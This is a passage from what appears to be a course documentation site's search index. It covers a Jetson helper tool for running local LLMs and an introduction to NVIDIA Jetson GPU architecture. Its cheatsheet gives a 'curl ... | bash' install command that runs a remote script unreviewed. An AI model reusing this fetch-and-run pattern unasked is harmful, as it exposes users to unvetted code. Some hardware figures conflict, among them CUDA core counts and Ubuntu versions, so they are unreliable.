mistral\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\ud83d\udcac Launching model 'mistral' in CLI...\npulling manifest \npulling ff82381e2bea: 100% \u2595\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258f 4.1 GB                         \npulling 43070e2d4e53: 100% \u2595\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258f  11 KB                         \npulling 1ff5b64b61b9: 100% \u2595\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258f  799 B                         \npulling ed11eda7790d: 100% \u2595\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258f   30 B                         \npulling 42347cd80dc8: 100% \u2595\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u258f  485 B                         \nverifying sha256 digest \nwriting manifest \nsuccess \n&gt;&gt;&gt; Send a message (/? for help)\n</code></pre> Launches interactive terminal mode using the mistral model. Enter <code>\\exit</code> to exit.</p> </li> <li> <p>List Installed Models <pre><code>$ sjsujetsontool ollama list\n\ud83e\udde0 Detected Jetson Model: NVIDIA Jetson Orin Nano Engineering Reference Developer Kit Super\n\u2699\ufe0f  CUDA Version: 12.6\n\ud83d\udcc3 Installed models:\nNAME               ID              SIZE      MODIFIED           \nmistral:latest     3944fe81ec14    4.1 GB    About a minute ago    \nllama3.2:latest    a80c4f17acd5    2.0 GB    2 hours ago           \nqwen2:latest       dd314f039b9d    4.4 GB    9 days ago            \nllama3.2:3b        a80c4f17acd5    2.0 GB    9 days ago \n</code></pre> Shows a table of downloaded models and their sizes.</p> </li> <li> <p>Download a New Model <pre><code>sjsujetsontool ollama pull llama3\n</code></pre> Pulls the specified model into the container. Examples include:     \u2022   phi3     \u2022   mistral     \u2022   llama3     \u2022   qwen:7b</p> </li> <li> <p>Delete a Model <pre><code>sjsujetsontool ollama delete mistral\n</code></pre> Frees up disk space by removing the model.</p> </li> <li> <p>Check Server Status <pre><code>sjsujetsontool ollama status\n</code></pre> Checks if the REST API is running on port 11434.</p> </li> <li> <p>Ask a Prompt (with auto-pull + caching) <pre><code>sjsujetsontool ollama ask \"What is nvidia jetson orin?\"\n</code></pre> Uses the last used model, or you can specify one: <pre><code>sjsujetsontool ollama ask --model mistral \"Explain transformers in simple terms.\"\n</code></pre>     \u2022   Automatically pulls model if not available     \u2022   Remembers last used model in .last_ollama_model under workspace/</p> </li> </ol> <p>\ud83e\uddea Example: Simple Chat Session</p> <p>Pull and run mistral model <pre><code>sjsujetsontool ollama pull mistral\nsjsujetsontool ollama run mistral\n</code></pre> Ask directly via REST <pre><code>sjsujetsontool ollama ask --model mistral \"Give me a Jetson-themed poem.\"\n</code></pre></p> <p>\u2e3b</p> <p>\ud83e\uddf0 Troubleshooting     \u2022   Port already in use: Run sudo lsof -i :11434 and kill the process if needed.     \u2022   Model not found: Use sjsujetsontool ollama pull  manually before ask or run.     \u2022   Server not running: Start with sjsujetsontool ollama serve before using REST API."},{"location":"curriculum/00_sjsujetsontool_guide/#sjsujetsontool-llama","title":"\ud83d\udd2c <code>sjsujetsontool llama</code>","text":"<p>Starts the <code>llama.cpp</code> server (C++ GGUF LLM inference engine) on port 8000. Loads a <code>.gguf</code> model and serves an HTTP API for tokenized prompt completion.</p> <p>After entering into the container, you can run a local downloaded model ('build_cuda' folder is the cuda build): <pre><code>root@sjsujetson-01:/Developer/llama.cpp# llama-cli -m /models/mistral.gguf -p \"Explain what is Nvidia jetson\"\n....\nllama_perf_sampler_print:    sampling time =      34.98 ms /   532 runs   (    0.07 ms per token, 15210.86 tokens per second)\nllama_perf_context_print:        load time =    3498.72 ms\nllama_perf_context_print: prompt eval time =    2193.93 ms /    17 tokens (  129.05 ms per token,     7.75 tokens per second)\nllama_perf_context_print:        eval time =   84805.65 ms /   514 runs   (  164.99 ms per token,     6.06 tokens per second)\nllama_perf_context_print:       total time =   92930.78 ms /   531 tokens\n</code></pre></p> <p><code>llama-server</code> is a lightweight, OpenAI API compatible, HTTP server for serving LLMs. Start a local HTTP server with default configuration on port 8080: <code>llama-server -m model.gguf --port 8080</code>, Basic web UI can be accessed via browser: <code>http://localhost:8080</code>. Chat completion endpoint: <code>http://localhost:8080/v1/chat/completions</code> <pre><code>root@sjsujetson-01:/Developer/llama.cpp# llama-server -m /models/mistral.gguf --port 8080\n</code></pre></p> <p>Send request via curl in another terminal (in the host machine or container): ```bash sjsujetson@sjsujetson-01:~$ curl http://localhost:8080/completion -d '{   \"prompt\": \"Explain what is Nvidia jetson?\",   \"n_predict\": 100 }'</p>"},{"location":"curriculum/00_sjsujetsontool_guide/#sjsujetsontool-status","title":"\ud83d\udce6 <code>sjsujetsontool status</code>","text":"<p>Displays:</p> <ul> <li>Docker container state</li> <li>GPU stats from <code>tegrastats</code></li> <li>Port listening status for key services</li> </ul>"},{"location":"curriculum/00_sjsujetsontool_guide/#sjsujetsontool-set-hostname-name","title":"\ud83d\udd27 <code>sjsujetsontool set-hostname &lt;name&gt;</code>","text":"<p>Changes device hostname, regenerates system identity, writes <code>/etc/device-id</code>.</p>"},{"location":"curriculum/00_sjsujetsontool_guide/#sjsujetsontool-stop","title":"\ud83d\uded1 <code>sjsujetsontool stop</code>","text":"<p>Stops the running Docker container started by previous commands.</p>"},{"location":"curriculum/00_sjsujetsontool_guide/#safety-guidelines","title":"\u26a0\ufe0f Safety Guidelines","text":"<ul> <li>\ud83d\udd0c Power Supply: Use a 5A USB-C adapter or official barrel jack for stability.</li> <li>\ud83d\udcbe SSD Cloning: Change the hostname and machine-id after cloning to prevent network conflicts.</li> <li>\ud83d\udd10 SSH Security: Only install SSH keys from trusted GitHub accounts.</li> <li>\ud83e\uddfc Disk Cleanup: Remove cache and large datasets before creating system images.</li> <li>\ud83d\udce6 Containers: Always stop containers with <code>sjsujetsontool stop</code> before unplugging.</li> </ul>"},{"location":"curriculum/00_sjsujetsontool_guide/#ready-to-learn-and-build","title":"\ud83e\udded Ready to Learn and Build","text":"<p>You're now equipped to:</p> <ul> <li>Run AI models (LLaMA, Mistral, DeepSeek, etc.)</li> <li>Build and test LLM applications</li> <li>Access Jetson remotely with SSH or VS Code</li> <li>Run real-time cyber/AI experiments on the edge!</li> </ul> <p>Made with \ud83d\udcbb by Kaikai Liu \u2014 GitHub Repo</p>"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/","title":"\ud83e\udde0 SJSU Jetson Tool Cheatsheet","text":"<p>A quick reference guide for using the <code>sjsujetsontool</code> utility on NVIDIA Jetson devices. Full tutorial: 00_sjsujetsontool_guide.md</p>"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#commands-by-category","title":"\ud83d\udccb Commands by Category","text":""},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#installation","title":"\ud83d\udce5 Installation","text":"Command Description <code>curl -fsSL https://raw.githubusercontent.com/lkk688/edgeAI/main/jetson/install_sjsujetsontool.sh \\| bash</code> Install (no sudo) <code>sjsujetsontool update</code> Update container &amp; script <code>sjsujetsontool update-container</code> Update container only <code>sjsujetsontool update-script</code> Update script only"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#basic-commands","title":"\ud83d\udd0d Basic Commands","text":"Command Description <code>sjsujetsontool list</code> Show all commands <code>sjsujetsontool version</code> Show versions <code>sjsujetsontool status</code> Show container &amp; GPU stats <code>sjsujetsontool debug</code> Run diagnostics"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#container-management","title":"\ud83d\udc33 Container Management","text":"Command Description <code>sjsujetsontool shell</code> Enter container shell <code>exit</code> Exit shell (container keeps running) <code>sjsujetsontool stop</code> Stop container completely"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#python-jupyter","title":"\ud83d\udc0d Python &amp; Jupyter","text":"Command Description <code>sjsujetsontool run /path/to/script.py</code> Run Python script in container <code>sjsujetsontool jupyter</code> Launch JupyterLab (port 8888)"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#ollama-llm-commands","title":"\ud83e\udde0 Ollama LLM Commands","text":"Command Description <code>sjsujetsontool ollama serve</code> Start server (port 11434) <code>sjsujetsontool ollama run qwen2</code> Run CLI mode (use <code>\\exit</code>) <code>sjsujetsontool ollama list</code> List installed models <code>sjsujetsontool ollama pull mistral</code> Download model <code>sjsujetsontool ollama delete mistral</code> Remove model <code>sjsujetsontool ollama status</code> Check server status <code>sjsujetsontool ollama ask \"What is NVIDIA Jetson?\"</code> Ask question (auto-pulls) <code>sjsujetsontool ollama ask --model mistral \"Explain transformers.\"</code> Ask with specific model"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#llamacpp-commands","title":"\ud83d\udd2c Llama.cpp Commands","text":"Command Description <code>sjsujetsontool llama</code> Start server (port 8000) <code>./build_cuda/bin/llama-cli -m /models/mistral.gguf -p \"prompt\"</code> Run model directly <code>./build_cuda/bin/llama-server -m /models/mistral.gguf --port 8080</code> Start HTTP server <code>curl http://localhost:8080/completion -d '{\"prompt\":\"...\",\"n_predict\":100}'</code> Query API <code>http://localhost:8080</code> Access web UI"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#system-management","title":"\ud83d\udd27 System Management","text":"Command Description <code>sjsujetsontool set-hostname new-hostname</code> Change hostname (sudo) <code>sjsujetsontool mount-nfs &lt;host&gt; &lt;path&gt; &lt;mount&gt;</code> Mount NFS share"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#important-information","title":"\ud83d\udcc2 Important Information","text":""},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#mounted-paths","title":"Mounted Paths","text":"<ul> <li>Host directories mounted in container:</li> <li><code>/Developer</code> \u2192 <code>/Developer</code> in container</li> <li><code>/Developer/models</code> \u2192 <code>/models</code> in container</li> </ul>"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#ssh-connectivity","title":"SSH Connectivity","text":"<ul> <li>Connect via mDNS hostname: <code>ssh username@jetson-hostname.local</code></li> <li>Example: <code>ssh sjsujetson@sjsujetson-01.local</code></li> <li>For X11 forwarding: <code>ssh -X sjsujetson@sjsujetson-01.local</code></li> </ul>"},{"location":"curriculum/00b_sjsujetsontool_cheatsheet/#safety-tips","title":"\u26a0\ufe0f Safety Tips","text":"<ul> <li>Power Supply: Use a 5A USB-C adapter or official barrel jack for power stability</li> <li>Containers: Always stop containers with <code>sjsujetsontool stop</code> before unplugging</li> <li>SSD Cloning: Change hostname and machine-id after cloning to prevent network conflicts</li> <li>SSH Security: Only install SSH keys from trusted GitHub accounts</li> <li>Disk Cleanup: Remove cache and large datasets before creating system images</li> </ul>"},{"location":"curriculum/01a_nvidia_jetson/","title":"\ud83d\udce6 Introduction to NVIDIA Jetson","text":"<p>Author: Dr. Kaikai Liu, Ph.D. Position: Associate Professor, Computer Engineering Institution: San Jose State University Contact: kaikai.liu@sjsu.edu</p>"},{"location":"curriculum/01a_nvidia_jetson/#what-is-nvidia-jetson","title":"\ud83d\udd0d What is NVIDIA Jetson?","text":""},{"location":"curriculum/01a_nvidia_jetson/#overview-of-nvidia-jetson","title":"\ud83e\udded Overview of NVIDIA Jetson","text":"<p>NVIDIA Jetson is a series of small, powerful computers (system-on-modules and developer kits) designed for edge AI, robotics, and embedded systems. It brings the power of NVIDIA\u2019s GPU architecture to low-power, compact platforms, enabling real-time computer vision, deep learning inference, and autonomous decision-making on devices deployed outside the data center.      - Launched: 2014, starting with the Jetson TK1.     - Key Purpose: To bring GPU-accelerated computing to embedded and edge devices for applications such as robotics, drones, autonomous vehicles, and AI at the edge.</p>"},{"location":"curriculum/01a_nvidia_jetson/#historical-evolution-of-nvidia-jetson","title":"\ud83d\udcdc Historical Evolution of NVIDIA Jetson","text":"Release Date Product Highlights Mar 2014 Jetson TK1 First Jetson board; Tegra K1 chip with Kepler GPU. Nov 2015 Jetson TX1 Introduced Maxwell GPU and enhanced CUDA support. Mar 2017 Jetson TX2 Pascal GPU; improved efficiency and performance. Sep 2018 Jetson AGX Xavier Volta GPU with Tensor Cores (~32 TOPS); industrial-grade AI. Mar 2019 Jetson Nano Developer Kit Affordable AI platform (~0.5\u202fTOPS), ideal for education and prototyping. May 2020 Jetson Xavier NX Volta GPU (~21\u202fTOPS); compact and powerful for edge applications. Apr 2022 Jetson AGX Orin Developer Kit Ampere GPU (~275\u202fTOPS); debuted in MLPerf benchmarks. Dec 2022 Jetson AGX Orin Production Module (32\u202fGB) Production version began shipping. Sep 2022 Jetson Orin Nano Developer Kit Entry-level Orin (~40\u202fTOPS) announced at GTC. Dec 17, 2024 Jetson Orin Nano Super Dev Kit Enhanced Orin Nano with 67 INT8 TOPS (1.7\u00d7 generative AI boost). <p>NVIDIA Unveils Its Most Affordable Generative AI Supercomputer The new NVIDIA Jetson Orin Nano Super Developer Kit, which fits in the palm of a hand, provides everyone from commercial AI developers to hobbyists and students, gains in generative AI capabilities and performance. And the price is now $249, down from $499. It delivers as much as a 1.7x leap in generative AI inference performance, a 70% increase in performance to 67 INT8 TOPS, and a 50% increase in memory bandwidth to 102GB/s compared with its predecessor. Introduction Video</p>"},{"location":"curriculum/01a_nvidia_jetson/#relation-to-other-nvidia-platforms","title":"\ud83d\udd17 Relation to Other NVIDIA Platforms","text":"Platform Chipset Use Case Jetson Nano Maxwell Entry-level AI and CV Jetson Xavier NX Volta Intermediate robotics, drones Jetson Orin Nano Ampere Education, AI, edge compute NVIDIA DRIVE AGX Orin Autonomous driving compute Switch 2 (rumor) Custom Orin High-performance gaming console <ul> <li>The Orin family spans from Jetson to automotive and even rumored consumer devices like the Nintendo Switch 2.</li> <li>Jetson Orin Nano shares architectural DNA with NVIDIA DRIVE Orin, used in autonomous vehicles.</li> </ul>"},{"location":"curriculum/01a_nvidia_jetson/#performance-comparison-with-other-platforms","title":"\u2696\ufe0f Performance Comparison with Other Platforms","text":"Device/Chipset AI Throughput (TOPS) Power (W) Notes Jetson Orin Nano (8GB) \\~40 TOPS 15W Optimized for edge AI and inference Apple M2 \\~15 TOPS (NPU est.) 20W\u201330W General-purpose SoC with ML acceleration Intel Core i7 (12th Gen) \\~1\u20132 TOPS (CPU only) 45W+ High compute, poor AI power efficiency Raspberry Pi 5 &lt;0.5 TOPS 5\u20137W General ARM SBC, no dedicated AI engine <ul> <li>Jetson Orin Nano provides a highly efficient balance of AI compute and power usage, ideal for on-device inference.</li> <li>It outperforms embedded CPUs and SBCs while being more power-efficient than traditional desktops.</li> </ul>"},{"location":"curriculum/01a_nvidia_jetson/#jetson-modules-and-their-gpu-architecture","title":"\ud83d\udce6 Jetson Modules and Their GPU Architecture","text":"<p>Jetson modules use cut-down versions of NVIDIA\u2019s main GPU architectures (Kepler, Maxwell, Pascal, Volta, Ampere, and now Blackwell) that are optimized for power efficiency, thermal limits, and edge deployment.</p> Jetson Module GPU Architecture Related Desktop GPU Series Jetson TK1 Kepler GTX 600 / 700 Series Jetson TX1 Maxwell GTX 900 Series Jetson TX2 Pascal GTX 10 Series Jetson AGX Xavier Volta Tesla V100-class (with Tensor Cores) Jetson Orin Series Ampere RTX 30 Series / A100-class (Future) Jetson Blackwell Blackwell (Expected) RTX 50 / B100-class GPUs <p>Jetson shares the CUDA, cuDNN, TensorRT, and DeepStream SDK software stacks with desktop and server-class GPUs, allowing AI/vision models developed in the cloud or lab to scale down for embedded inference.</p> <p>The Jetson Orin Nano brings the powerful Ampere architecture to embedded AI platforms. With Ampere\u2019s Tensor Cores and optimized power/performance, Jetson Orin Nano can run modern transformers, YOLOv8, and vision-language models\u2014right on the edge. - GPU: 512-core Ampere GPU with 16 Tensor Cores - AI Performance: Up to 40 TOPS (INT8), or 67 TOPS on the Orin Nano Super - CPU: 6-core ARM Cortex-A78AE - Memory: 4GB or 8GB LPDDR5 - Target Use Cases: Robotics, smart cameras, low-power edge AI</p>"},{"location":"curriculum/01a_nvidia_jetson/#architecture-comparison-desktop-data-center","title":"\u2699\ufe0f Architecture Comparison: Desktop / Data Center","text":"Architecture GPUs / Chips Precision Support Tensor Core Gen Memory Bandwidth Notes Kepler GTX 600 / Jetson TK1 FP32 N/A ~192 GB/s First unified memory Maxwell GTX 900 / Jetson TX1 FP32 N/A ~200 GB/s Energy efficiency focus Pascal GTX 10 / Jetson TX2 FP32, FP16 None ~300 GB/s Deep learning training begins Volta Tesla V100 / Xavier FP32, FP16, INT8 1st Gen ~900 GB/s (HBM2) Introduced Tensor Cores Ampere RTX 30xx / A100 / Orin FP32, FP16, TF32, INT8 3rd Gen 1.5 TB/s (A100), 204 GB/s (Orin) TF32 and structured sparsity Ada Lovelace RTX 40xx FP8, FP16, INT8 4th Gen ~1 TB/s Optimized for raster + transformer Blackwell RTX 50xx, B100, GB200 FP8, TF32, INT4 5th Gen 1.8\u20133.0 TB/s (HBM3E) AI fusion, FP8/INT4 LLM inference"},{"location":"curriculum/01a_nvidia_jetson/#introduction-to-gpu-architecture","title":"\ud83e\udde0 Introduction to GPU Architecture","text":"<p>A Graphics Processing Unit (GPU) is a parallel processor optimized for data-parallel throughput computing. Unlike CPUs which have a handful of powerful cores optimized for control flow and single-threaded performance, GPUs feature many simpler cores that execute instructions on SIMD or SIMT (Single Instruction, Multiple Threads) principles\u2014ideal for vectorizable and matrix-heavy workloads like:</p> <ul> <li>Deep neural network inference</li> <li>Image and signal processing</li> <li>Linear algebra (matrix multiplication, convolutions)</li> <li>Physics and fluid dynamics simulations</li> </ul> <p>A GPU is composed of several Streaming Multiprocessors (SMs), each containing:</p> <ul> <li>CUDA Cores: Scalar ALUs for FP32/INT32 operations</li> <li>Tensor Cores: Fused multiply-accumulate (FMA) engines for low-precision matrix ops (e.g., FP16/INT8/INT4)</li> <li>Warp Scheduler: Dispatches 32-thread warps to available execution units</li> <li>Register Files &amp; Shared Memory: On-chip fast memory for intra-thread block communication</li> <li>Special Function Units: For transcendental math like sin, cos, exp, rsqrt</li> </ul> <p>GPUs are designed with a non-uniform memory hierarchy to balance throughput and latency:</p> <ul> <li>Global Memory (DRAM): High-latency, high-bandwidth (e.g., LPDDR5 on Jetson, HBM on data center GPUs)</li> <li>Shared Memory / L1 Cache: Low-latency memory within SMs for intra-thread block comms</li> <li>L2 Cache: Shared across SMs; allows memory coalescing</li> <li>Texture/Constant Memory: Specialized caches for spatial or read-only access</li> </ul> <p>Bandwidth is often the bottleneck in GPU computing, not ALU count. Efficient memory coalescing and reuse (e.g., tiling, blocking) are key to performance.</p> <p>NVIDIA GPUs follow a SIMT (Single Instruction, Multiple Threads) model:</p> <ul> <li>Threads are grouped into warps (32 threads)</li> <li>Each warp executes the same instruction path; divergence (e.g., <code>if</code> branches) leads to warp serialization</li> <li>Multiple warps and thread blocks are scheduled per SM</li> </ul> <p>Execution granularity is fine-tuned through occupancy: the ratio of active warps to maximum supported warps on an SM.</p> <p>The Streaming Multiprocessor (SM) is the fundamental hardware unit in NVIDIA GPUs responsible for executing parallel instructions. It encapsulates the resources necessary to support thousands of concurrent threads, and its microarchitecture directly determines latency hiding, throughput, and occupancy. Each GPU consists of multiple SMs (e.g., 16\u2013128+), and each SM contains:</p> Component Description CUDA Cores (ALUs) Scalar processors for FP32, INT32, and logical ops Tensor Cores Matrix-multiply\u2013accumulate units for FP16, BF16, INT8, and sparsity-optimized operations Warp Scheduler Dispatches one or more warps per cycle to execution pipelines Instruction Dispatch Units Decodes and routes instructions to functional units Shared Memory / L1 Cache Programmable, low-latency memory for inter-thread communication Register File Stores private per-thread variables (e.g., 64K registers per SM) Special Function Units (SFUs) Handles transcendental math like <code>exp</code>, <code>sin</code>, <code>rsqrt</code> Load/Store Units Handles memory transactions to/from global/local memory <p>Each SM contains Tensor Cores\u2014specialized FMA (fused multiply-accumulate) units capable of processing small matrices at very high throughput.</p> <ul> <li>Operate on 4\u00d74 or 8\u00d78 matrices internally.</li> <li>Support mixed-precision input/output (FP16, INT8, FP8, TF32).</li> <li>Enable high-throughput operations for convolutions, transformers, and matrix multiplications.</li> </ul> <p>Example: On Jetson Orin Nano (Ampere): - Each SM has 1 Tensor Core - Each Tensor Core processes 64 FP16 or 128 INT8 FMA ops per cycle - With 16 SMs \u00d7 128 INT8 ops, theoretical peak = ~32K ops/cycle</p> <p>Each SM has a large register file (e.g., 64 KB per SM) and shared memory / L1 cache (up to 128 KB depending on configuration).</p> <ul> <li>Registers are used for fast local thread variables.</li> <li>Shared memory is explicitly managed by the programmer and ideal for:</li> <li>Tiled matrix multiplication</li> <li>Reductions</li> <li>Communication across threads in a block</li> </ul> <p>Proper register allocation and shared memory usage are critical for occupancy\u2014too many registers per thread can limit the number of resident warps.</p> <p>Example: SM Configuration on Jetson Orin Nano</p> Feature Value SMs 16 CUDA Cores per SM 32 Tensor Cores per SM 1 Total CUDA Cores 512 Warp Schedulers per SM 1 Registers per SM 64K Shared Memory per SM 64\u2013128 KB FP16/INT8 Tensor Ops Accelerated by dedicated tensor units Max Warps per SM 64 Max Threads per SM 2048"},{"location":"curriculum/01a_nvidia_jetson/#execution-granularity-threads-warps-and-thread-blocks","title":"\ud83d\udce6 Execution Granularity: Threads, Warps, and Thread Blocks","text":"<p>A single SM can hold multiple warps from multiple thread blocks. The GPU scheduler dynamically switches between warps to hide memory and instruction latency. - Thread: Basic unit of execution; executes the kernel\u2019s code independently. - Warp: Group of 32 threads executed in SIMT fashion (Single Instruction, Multiple Threads). - Thread Block: Group of warps scheduled together and sharing resources like shared memory.</p> <p>Example: When one warp stalls on a memory load, another ready warp is dispatched without pipeline stalls.</p> <p>Each SM contains multiple warp schedulers (e.g., 4 in Ampere SMs), which issue instructions per cycle from active warps to the relevant execution pipelines. Warp scheduling is round-robin or greedy-then-oldest, depending on architecture. Execution Pipelines (Ampere example):</p> Pipeline Operations Handled FP32 Units Scalar arithmetic (add, mul) INT Units Integer math, bitwise logic Tensor Cores Fused matrix ops (e.g. <code>D = A\u00d7B + C</code>) SFUs <code>sin</code>, <code>exp</code>, <code>log</code>, <code>sqrt</code>, etc. LD/ST Units Memory read/write transactions Branch Units Handles divergence and predication <p>Up to 4 instructions from different warps can be issued per cycle per SM, depending on available resources.</p> <p>GPUs do not use traditional out-of-order execution. Instead, they rely on:</p> <ul> <li>Thread-level parallelism (TLP): Multiple warps in-flight per SM</li> <li>Warp-level parallelism (WLP): Warp interleaving masks memory/instruction latency</li> </ul> <p>Occupancy = (Active warps per SM) / (Maximum warps per SM)</p> <ul> <li>Higher occupancy helps hide memory latency</li> <li>Too high occupancy can lead to register pressure or shared memory contention</li> </ul>"},{"location":"curriculum/01a_nvidia_jetson/#nvidias-official-software-stack-for-jetson","title":"\ud83d\udd39 NVIDIA's official software stack for Jetson","text":"<p>NVIDIA's official software stack for Jetson, includes:</p> <ul> <li>Ubuntu 20.04</li> <li>CUDA Toolkit</li> <li>cuDNN (Deep Neural Network library)</li> <li>TensorRT (optimized inference engine)</li> <li>OpenCV and multimedia APIs</li> </ul> <p>\ud83d\ude80 CUDA, cuDNN, TensorRT Comparison and Modern GPU Architectures:     - \ud83d\udd39 CUDA (Compute Unified Device Architecture): Parallel computing platform and programming model that allows developers to harness the power of NVIDIA GPUs for general-purpose computing.     - \ud83d\udd39 TensorRT: High-performance deep learning inference optimizer and runtime engine. Used to accelerate models exported from PyTorch or ONNX.     - \ud83d\udd39 cuDNN: CUDA Deep Neural Network library: provides optimized implementations of operations such as convolution, pooling, and activation for deep learning.</p> <p>\ud83d\udce6 Layered Abstraction for GPU AI Inference</p> Layer Tool Purpose High-Level TensorRT Optimized deployment, quantization, engine runtime Mid-Level cuDNN Primitives for DL ops (Conv, Pool, RNN, etc.) Low-Level CUDA General GPU programming with warp/thread/memory control"},{"location":"curriculum/01a_nvidia_jetson/#jetson-orin-nano-super-developer-kit","title":"\u2699\ufe0f Jetson Orin Nano Super Developer Kit","text":""},{"location":"curriculum/01a_nvidia_jetson/#module-specifications","title":"Module Specifications","text":"<p>The Jetson Orin Nano 8GB Module features: - Architecture: NVIDIA Ampere with 1024 CUDA cores and 32 tensor cores - AI Performance: Up to 67 INT8 TOPS - Memory: 8GB 128-bit LPDDR5 (102GB/s memory bandwidth) - CPU: 6-core Arm\u00ae Cortex\u00ae-A78AE v8.2 64-bit (1.7GHz) with 1.5MB L2 + 4MB L3 - Power Range: 7W\u201325W</p> <p>You can flash the base L4T BSP using SDK Manager on any of these storage media: - SD card slot (1) - External NVMe (2280-size on slot 10, 2230-size on slot 11) - USB drive on any USB port (4 or 6)</p> Feature Value Model Jetson Orin Nano Form Factor 69.6mm \u00d7 45mm JetPack SDK Ubuntu 20.04 + CUDA, cuDNN, TensorRT IO Support GPIO, I2C, SPI, UART, MIPI CSI Variants 4GB RAM (5W) and 8GB RAM (7-15W) Storage microSD / M.2 NVMe SSD support"},{"location":"curriculum/01a_nvidia_jetson/#key-components-of-the-carrier-board","title":"Key Components of the Carrier Board","text":"<ul> <li>Camera Connectors:</li> <li>2\u00d7 MIPI CSI-2 camera connectors (0.5mm pitch 22-pin flex connectors)</li> <li>Compatible with 15-pin connector (like Raspberry Pi Camera Module v2) using a 15-pin to 22-pin conversion cable</li> <li> <p>Supports: CAM0: CSI 1 \u00d72 lane, CAM1: CSI 1 \u00d72 lane or 1 \u00d74 lane</p> </li> <li> <p>Storage Expansion:</p> </li> <li>M.2 Key M slot with \u00d74 PCIe Gen3</li> <li>M.2 Key M slot with \u00d72 PCIe Gen3</li> <li> <p>M.2 Key E slot</p> </li> <li> <p>USB Connectivity:</p> </li> <li>4\u00d7 USB 3.2 Gen2 Type-A ports</li> <li> <p>USB Type-C port for UFP (cannot output display signal)</p> <ul> <li>Host mode: Functions as downstream-facing port (DFP), like the Type-A ports</li> <li>Device mode: Connects to PC as USB Mass Storage, Serial, and Ethernet (RNDIS) device (Jetson IP: 192.168.55.1)</li> <li>Recovery mode: Used for flashing Jetson from PC</li> </ul> </li> <li> <p>Other Interfaces:</p> </li> <li>Gigabit Ethernet port</li> <li>DisplayPort: 1\u00d7 DP 1.2 (+MST) connector</li> <li>40-pin expansion header (UART, SPI, I2S, I2C, GPIO)</li> <li>12-pin button header and 4-pin fan header</li> <li> <p>DC power jack for 19V power input</p> </li> <li> <p>Dimensions: 103mm \u00d7 90.5mm \u00d7 34.77mm</p> </li> </ul>"},{"location":"curriculum/01a_nvidia_jetson/#carrier-board-connectors","title":"Carrier Board Connectors","text":"Mark. Name Note 1 microSD card slot 2 40-pin Expansion Header 3 Power Indicator LED 4 USB-C port For data only 5 Gigabit Ethernet Port 6 USB 3.2 Gen2 Type-A ports (\u00d74) 10Gbps 7 DisplayPort Output Connector 8 DC Power Jack 5.5mm x 2.5mm 9 MIPI CSI Camera Connectors (x2) 22pin, 0.5mm pitch 10 M.2 Slot (Key-M, Type 2280) PCIe 3.0 x4 11 M.2 Slot (Key-M, Type 2230) PCIe 3.0 x2 12 M.2 Slot (Key-E, Type 2230) (populated)"},{"location":"curriculum/01a_nvidia_jetson/#40-pin-expansion-header","title":"40-pin Expansion Header","text":""},{"location":"curriculum/01a_nvidia_jetson/#references","title":"References","text":"<ul> <li>Jetson Orin Nano Developer Kit User Guide - Hardware Specs</li> <li>Jetson Datasheet</li> <li>Jetson Orin Nano Developer Kit User Guide - Software Setup</li> <li>Jetson Orin Nano Developer Kit Getting Started Guide</li> <li>Jetson Orin Nano Developer Kit Carrier Board Specification</li> <li>Jetson Orin Nano Initial Setup using SDK Manager</li> </ul>"},{"location":"curriculum/01a_nvidia_jetson/#first-boot-on-ssd","title":"\ud83e\uddea First Boot on SSD","text":"<ol> <li>Connect Jetson to the Monitor:</li> <li>If still plugged, remove the jumper from header (that was used to put it in Forced Recovery mode)</li> <li>Connect the DisplayPort cable or adapter and USB keyboard and mouse to Jetson Orin Nano Developer Kit, or hook up the USB to TTL Serial cable.</li> <li>Unplug the power supply and put back in to power cycle.</li> <li> <p>Jetson should now boot into the Jetson Linux (BSP) of your selected JetPack version from the storage of your choice.</p> </li> <li> <p>Power up Jetson \u2014 it will boot from SSD automatically.</p> </li> <li> <p>Complete initial Ubuntu setup wizard (username, password, time zone).</p> </li> <li> <p>Optional: Verify SSD is rootfs:    <pre><code>df -h /\n# Output should show something like: /dev/nvme0n1p1\n#Identify your NVMe SSD\nsjsujetson@sjsujetson-01:~$ lsblk\n</code></pre></p> </li> <li> <p>Optional: Check JetPack version    <pre><code>sjsujetson@sjsujetson-01:~$ dpkg-query --show nvidia-l4t-core\nnvidia-l4t-core  36.4.3-20250107174145\nsjsujetson@sjsujetson-01:~$ dpkg -l | grep nvidia*\n</code></pre> It shows L4T 36.4.3, which corresponds to JetPack 6.2 Official mapping reference. JetPack 6.2 is the latest production release of JetPack 6. This release includes Jetson Linux 36.4.3, featuring the Linux Kernel 5.15 and an Ubuntu 22.04-based root file system. The Jetson AI stack packaged with JetPack 6.2 includes CUDA 12.6, TensorRT 10.3, cuDNN 9.3, VPI 3.2, DLA 3.1, and DLFW 24.0.</p> </li> </ol>"},{"location":"curriculum/01a_nvidia_jetson/#jetson-development-workflow-in-sjsu","title":"\ud83e\uddea Jetson Development Workflow in SJSU","text":"<p>We have prepared a master Jetson image preloaded with the latest JetPack 6.2, NVIDIA Container Toolkit (Docker support), and all essential runtime and development components that typically require elevated privileges. This includes CUDA, cuDNN, TensorRT, DeepStream, and necessary drivers.</p> <p>Students can simply SSH into their assigned Jetson device and begin testing 